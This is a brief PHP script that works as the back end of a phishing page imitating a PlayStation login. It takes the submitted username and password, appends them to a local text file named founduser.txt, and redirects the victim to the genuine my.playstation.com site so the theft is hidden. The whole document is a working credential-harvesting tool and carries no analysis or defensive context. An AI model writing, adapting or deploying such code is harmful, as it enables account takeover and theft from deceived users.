<?php
 $user = $_POST["j_username"];
 $pass = $_POST["j_password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: https://my.playstation.com/');
 exit()
?>

